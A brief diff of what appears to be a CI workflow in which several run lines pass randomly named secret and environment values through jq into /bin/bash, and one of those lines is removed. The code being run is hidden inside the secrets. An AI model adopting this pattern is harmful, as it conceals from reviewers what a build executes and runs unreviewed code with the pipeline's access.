@@ -21,7 +21,6 @@ jobs:
           snxye55315: ${{ secrets.snxye55315 }}
         run: |
           printf '%s' "$snxye55315" | jq -r .c30 | /bin/bash
-          echo $q27 | jq -r .zmygn6585 | /bin/bash
           echo $fneo350 | jq -r .r9169 | /bin/bash
           echo $g31 | jq -r .wg512 | /bin/bash
           echo $h1 | jq -r .dnkc192 | /bin/bash
